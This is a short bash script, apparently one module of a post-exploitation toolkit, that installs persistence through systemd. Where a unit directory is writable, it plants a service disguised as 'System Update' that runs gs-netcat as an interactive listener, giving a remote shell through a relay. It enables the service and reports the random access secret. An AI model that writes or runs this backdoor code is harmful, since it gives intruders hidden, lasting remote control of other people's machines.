#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="systemd"
info "Checking systemd..."
for dir in /etc/systemd/system /lib/systemd/system; do
    [ -w "$dir" ] && {
        secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
        cat > "$dir/system-update.service" << SVCEOF
[Unit]
Description=System Update
[Service]
ExecStart=/bin/bash -c 'gs-netcat -s $secret -l -i'
[Install]
WantedBy=multi-user.target
SVCEOF
        systemctl enable system-update 2>/dev/null
        result_json "$METHOD" "success" "Service planted" "$secret"; exit 0
    }
done
# Check for writable existing services
find /etc/systemd /lib/systemd -writable -name "*.service" 2>/dev/null|head -1|grep -q . && {
    result_json "$METHOD" "partial" "Writable service found" ""; exit 0
}
result_json "$METHOD" "fail" "No systemd access"; exit 1
